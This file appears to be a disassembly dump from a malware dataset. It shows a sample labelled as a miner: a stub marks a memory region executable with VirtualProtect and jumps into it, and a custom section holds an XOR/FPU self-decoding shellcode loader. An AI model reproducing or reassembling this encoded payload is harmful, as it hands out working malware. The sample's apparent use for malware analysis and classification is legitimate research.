
malware_samples/miner/5be457035066485281cf7dc5ba6ce8ba471680947b365bf97decdbbcd0d46af9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	51                   	push   %ecx
  401004:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401007:	50                   	push   %eax
  401008:	6a 40                	push   $0x40
  40100a:	68 00 10 00 00       	push   $0x1000
  40100f:	68 00 30 40 00       	push   $0x403000
  401014:	ff 15 00 20 40 00    	call   *0x402000
  40101a:	b9 00 30 40 00       	mov    $0x403000,%ecx
  40101f:	ff d1                	call   *%ecx
  401021:	90                   	nop
  401022:	33 c0                	xor    %eax,%eax
  401024:	8b e5                	mov    %ebp,%esp
  401026:	5d                   	pop    %ebp
  401027:	c3                   	ret

Disassembly of section .wurj:

00405000 <.wurj>:
  405000:	be ed 3e 4a 26       	mov    $0x264a3eed,%esi
  405005:	db d0                	fcmovnbe %st(0),%st
  405007:	d9 74 24 f4          	fnstenv -0xc(%esp)
  40500b:	5a                   	pop    %edx
  40500c:	33 c9                	xor    %ecx,%ecx
  40500e:	b1 74                	mov    $0x74,%cl
  405010:	83 ea fc             	sub    $0xfffffffc,%edx
  405013:	31 72 10             	xor    %esi,0x10(%edx)
  405016:	03 72 10             	add    0x10(%edx),%esi
  405019:	0f cb                	bswap  %ebx
  40501b:	91                   	xchg   %eax,%ecx
  40501c:	e1 77                	loope  0x405095
  40501e:	0f 28 09             	movaps (%ecx),%xmm1
  405021:	cf                   	iret
  405022:	a9 40 f1 3b 12       	test   $0x123bf140,%eax
  405027:	80 30 72             	xorb   $0x72,(%eax)
  40502a:	c8 e3 81 6e          	enter  $0x81e3,$0x6e
  40502e:	90                   	nop
  40502f:	c7 02 8d d5 d1 e8    	movl   $0xe8d1d58d,(%edx)
  405035:	5f                   	pop    %edi
  405036:	0d eb 7d 1b 63       	or     $0x631b7deb,%eax
  40503b:	58                   	pop    %eax
  40503c:	04 b9                	add    $0xb9,%al
  40503e:	60                   	pusha
  40503f:	6a 92                	push   $0xffffff92
  405041:	ed                   	in     (%dx),%eax
  405042:	81 f6 5e fe c8 6a    	xor    $0x6ac8fe5e,%esi
  405048:	b7 78                	mov    $0x78,%bh
  40504a:	5d                   	pop    %ebp
  40504b:	fb                   	sti
  40504c:	92                   	xchg   %eax,%edx
  40504d:	60                   	pusha
  40504e:	a1 99 82 4a af       	mov    0xaf4a8299,%eax
  405053:	bb 1c ba e6 f3       	mov    $0xf3e6ba1c,%ebx
  405058:	d4 50                	aam    $0x50
  40505a:	dc 61 5a             	fsubl  0x5a(%ecx)
  40505d:	63 5a 98             	arpl   %ebx,-0x68(%edx)
  405060:	74 a6                	je     0x405008
  405062:	fd                   	std
  405063:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405064:	8b 46 85             	mov    -0x7b(%esi),%eax
  405067:	65 f8                	gs clc
  405069:	e7 70                	out    %eax,$0x70
  40506b:	05 4f 7a d5 dc       	add    $0xdcd57a4f,%eax
  405070:	6e                   	outsb  %ds:(%esi),(%dx)
  405071:	b1 be                	mov    $0xbe,%cl
  405073:	b5 79                	mov    $0x79,%ch
  405075:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405076:	5e                   	pop    %esi
  405077:	68 be ee 7b 25       	push   $0x257beebe
  40507c:	7b fb                	jnp    0x405079
  40507e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40507f:	62 91 44 42 92 f1    	bound  %edx,-0xe6dbdbc(%ecx)
  405085:	ca b0 ea             	lret   $0xeab0
  405088:	b7 ed                	mov    $0xed,%bh
  40508a:	fd                   	std
  40508b:	79 2e                	jns    0x4050bb
  40508d:	06                   	push   %es
  40508e:	91                   	xchg   %eax,%ecx
  40508f:	e2 ff                	loop   0x405090
  405091:	e7 e9                	out    %eax,$0xe9
  405093:	d6                   	salc
  405094:	6b 8f ed a2 51 61 ca 	imul   $0xffffffca,0x6151a2ed(%edi),%ecx
  40509b:	36 99                	ss cltd
  40509d:	da af aa e9 c2 24    	fisubrl 0x24c2e9aa(%edi)
  4050a3:	ec                   	in     (%dx),%al
  4050a4:	6a 93                	push   $0xffffff93
  4050a6:	a3 1b da 62 1d       	mov    %eax,0x1d62da1b
  4050ab:	26 e3 3b             	es jecxz 0x4050e9
  4050ae:	ba 2f c1 10 27       	mov    $0x2710c12f,%edx
  4050b3:	d4 ac                	aam    $0xac
  4050b5:	9e                   	sahf
  4050b6:	f1                   	int1
  4050b7:	5f                   	pop    %edi
  4050b8:	98                   	cwtl
  4050b9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4050ba:	73 0c                	jae    0x4050c8
  4050bc:	46                   	inc    %esi
  4050bd:	f9                   	stc
  4050be:	71 73                	jno    0x405133
  4050c0:	c4                   	(bad)
  4050c1:	da cd                	fcmove %st(5),%st
  4050c3:	5f                   	pop    %edi
  4050c4:	55                   	push   %ebp
  4050c5:	80 f7 55             	xor    $0x55,%bh
  4050c8:	0a 53 a1             	or     -0x5f(%ebx),%dl
  4050cb:	08 47 a8             	or     %al,-0x58(%edi)
  4050ce:	26 66 05 ae 5b       	es add $0x5bae,%ax
  4050d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4050d4:	87 70 5a             	xchg   %esi,0x5a(%eax)
  4050d7:	04 75                	add    $0x75,%al
  4050d9:	1e                   	push   %ds
  4050da:	44                   	inc    %esp
  4050db:	ea ac c3 b7 99 b2 c0 	ljmp   $0xc0b2,$0x99b7c3ac
  4050e2:	61                   	popa
  4050e3:	43                   	inc    %ebx
  4050e4:	74 13                	je     0x4050f9
  4050e6:	77 36                	ja     0x40511e
  4050e8:	0c 47                	or     $0x47,%al
  4050ea:	b3 e0                	mov    $0xe0,%bl
  4050ec:	c4 4f 3f             	les    0x3f(%edi),%ecx
  4050ef:	33 f1                	xor    %ecx,%esi
  4050f1:	8e ee                	mov    %esi,%gs
  4050f3:	e1 39                	loope  0x40512e
  4050f5:	2b ce                	sub    %esi,%ecx
  4050f7:	1d 8c e6 4a 65       	sbb    $0x654ae68c,%eax
  4050fc:	27                   	daa
  4050fd:	d2 64 13 30          	shlb   %cl,0x30(%ebx,%edx,1)
  405101:	d2 7b ac             	sarb   %cl,-0x54(%ebx)
  405104:	87 83 29 e1 41 1c    	xchg   %eax,0x1c41e129(%ebx)
  40510a:	e0 de                	loopne 0x4050ea
  40510c:	ee                   	out    %al,(%dx)
  40510d:	cf                   	iret
  40510e:	f2 66 32 59 dd       	repnz data16 xor -0x23(%ecx),%bl
  405113:	86 d6                	xchg   %dl,%dh
  405115:	e5 62                	in     $0x62,%eax
  405117:	ad                   	lods   %ds:(%esi),%eax
  405118:	9b                   	fwait
  405119:	1f                   	pop    %ds
  40511a:	a8 92                	test   $0x92,%al
  40511c:	5b                   	pop    %ebx
  40511d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40511e:	17                   	pop    %ss
  40511f:	81 60 40 ba 8b 64 72 	andl   $0x72648bba,0x40(%eax)
  405126:	d6                   	salc
  405127:	c5 23                	lds    (%ebx),%esp
  405129:	c2 b6 cd             	ret    $0xcdb6
  40512c:	b5 2e                	mov    $0x2e,%ch
  40512e:	4e                   	dec    %esi
  40512f:	e5 66                	in     $0x66,%eax
  405131:	76 08                	jbe    0x40513b
  405133:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405134:	08 3c 29             	or     %bh,(%ecx,%ebp,1)
  405137:	c6                   	(bad)
  405138:	e2 44                	loop   0x40517e
  40513a:	24 61                	and    $0x61,%al
  40513c:	41                   	inc    %ecx
  40513d:	2b 09                	sub    (%ecx),%ecx
  40513f:	c7                   	(bad)
  405140:	4a                   	dec    %edx
  405141:	55                   	push   %ebp
  405142:	7f 35                	jg     0x405179
  405144:	fc                   	cld
  405145:	db cf                	fcmovne %st(7),%st
  405147:	b0 90                	mov    $0x90,%al
  405149:	1f                   	pop    %ds
  40514a:	fe                   	(bad)
  40514b:	6c                   	insb   (%dx),%es:(%edi)
  40514c:	1c 65                	sbb    $0x65,%al
  40514e:	85 06                	test   %eax,(%esi)
  405150:	f1                   	int1
  405151:	77 21                	ja     0x405174
  405153:	08 6c 35 91          	or     %ch,-0x6f(%ebp,%esi,1)
  405157:	4f                   	dec    %edi
  405158:	e3 d2                	jecxz  0x40512c
  40515a:	a2 af ba 17 0b       	mov    %al,0xb17baaf
  40515f:	a1 1e ff b7 9e       	mov    0x9eb7ff1e,%eax
  405164:	79 0a                	jns    0x405170
  405166:	2c da                	sub    $0xda,%al
  405168:	73 78                	jae    0x4051e2
  40516a:	46                   	inc    %esi
  40516b:	04 f5                	add    $0xf5,%al
  40516d:	cd 57                	int    $0x57
  40516f:	9a d1 60 4a 44 b7 d7 	lcall  $0xd7b7,$0x444a60d1
  405176:	e1 7b                	loope  0x4051f3
  405178:	97                   	xchg   %eax,%edi
  405179:	3f                   	aas
  40517a:	79 6e                	jns    0x4051ea
  40517c:	6b bb 19 cd fe 6c 8e 	imul   $0xffffff8e,0x6cfecd19(%ebx),%edi
  405183:	8d                   	lea    (bad),%ebp
  405184:	ed                   	in     (%dx),%eax
  405185:	8a 48 3d             	mov    0x3d(%eax),%cl
  405188:	fd                   	std
  405189:	3c 3b                	cmp    $0x3b,%al
  40518b:	02 30                	add    (%eax),%dh
  40518d:	3a 41 ea             	cmp    -0x16(%ecx),%al
  405190:	15 51 7d f6 16       	adc    $0x16f67d51,%eax
  405195:	43                   	inc    %ebx
  405196:	2f                   	das
  405197:	d5 be                	aad    $0xbe
  405199:	ee                   	out    %al,(%dx)
  40519a:	44                   	inc    %esp
  40519b:	e7 08                	out    %eax,$0x8
  40519d:	6f                   	outsl  %ds:(%esi),(%dx)
  40519e:	36 00 63 fe          	add    %ah,%ss:-0x2(%ebx)
  4051a2:	b6 b5                	mov    $0xb5,%dh
  4051a4:	ef                   	out    %eax,(%dx)
  4051a5:	24 f1                	and    $0xf1,%al
  4051a7:	4d                   	dec    %ebp
  4051a8:	0a 7c 4d 4e          	or     0x4e(%ebp,%ecx,2),%bh
  4051ac:	ad                   	lods   %ds:(%esi),%eax
  4051ad:	e9 18 03 61 ba       	jmp    0xbaa154ca
  4051b2:	f2 1e                	repnz push %ds
  4051b4:	d2 0a                	rorb   %cl,(%edx)
  4051b6:	e2 69                	loop   0x405221
  4051b8:	7e 54                	jle    0x40520e
  4051ba:	c3                   	ret
  4051bb:	83 2d b7 a6 3d 60 c6 	subl   $0xffffffc6,0x603da6b7
  4051c2:	42                   	inc    %edx
  4051c3:	d7                   	xlat   %ds:(%ebx)
  4051c4:	cf                   	iret
  4051c5:	a9 2f 84 83 8b       	test   $0x8b83842f,%eax
  4051ca:	9e                   	sahf
  4051cb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4051cc:	8a 9d 3e 0c e4 b9    	mov    -0x461bf3c2(%ebp),%bl
  4051d2:	53                   	push   %ebx
  4051d3:	25 bf cf c5 9f       	and    $0x9fc5cfbf,%eax
  4051d8:	aa                   	stos   %al,%es:(%edi)
  4051d9:	5a                   	pop    %edx
  4051da:	5f                   	pop    %edi
  4051db:	60                   	pusha
  4051dc:	83 27 6e             	andl   $0x6e,(%edi)
  4051df:	58                   	pop    %eax
  4051e0:	b5 6e                	mov    $0x6e,%ch
  4051e2:	20 dd                	and    %bl,%ch
  4051e4:	10 28                	adc    %ch,(%eax)
  4051e6:	ae                   	scas   %es:(%edi),%al
  4051e7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4051e8:	15 00 00 00 00       	adc    $0x0,%eax
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 18                	add    %bl,(%eax)
  4051f1:	52                   	push   %edx
  4051f2:	00 00                	add    %al,(%eax)
  4051f4:	00 00                	add    %al,(%eax)
  4051f6:	00 00                	add    %al,(%eax)
  4051f8:	ff                   	(bad)
  4051f9:	ff                   	(bad)
  4051fa:	ff                   	(bad)
  4051fb:	ff 20                	jmp    *(%eax)
  4051fd:	52                   	push   %edx
  4051fe:	00 00                	add    %al,(%eax)
  405200:	00 20                	add    %ah,(%eax)
	...
  405216:	00 00                	add    %al,(%eax)
  405218:	2e 52                	cs push %edx
  40521a:	00 00                	add    %al,(%eax)
  40521c:	00 00                	add    %al,(%eax)
  40521e:	00 00                	add    %al,(%eax)
  405220:	4b                   	dec    %ebx
  405221:	45                   	inc    %ebp
  405222:	52                   	push   %edx
  405223:	4e                   	dec    %esi
  405224:	45                   	inc    %ebp
  405225:	4c                   	dec    %esp
  405226:	33 32                	xor    (%edx),%esi
  405228:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40522b:	6c                   	insb   (%dx),%es:(%edi)
  40522c:	00 00                	add    %al,(%eax)
  40522e:	08 06                	or     %al,(%esi)
  405230:	56                   	push   %esi
  405231:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  405238:	72 6f                	jb     0x4052a9
  40523a:	74 65                	je     0x4052a1
  40523c:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  405240:	00 10                	add    %dl,(%eax)
  405242:	00 00                	add    %al,(%eax)
  405244:	10 00                	adc    %al,(%eax)
  405246:	00 00                	add    %al,(%eax)
  405248:	10 30                	adc    %dh,(%eax)
  40524a:	16                   	push   %ss
  40524b:	30 1b                	xor    %bl,(%ebx)
  40524d:	30 00                	xor    %al,(%eax)
	...
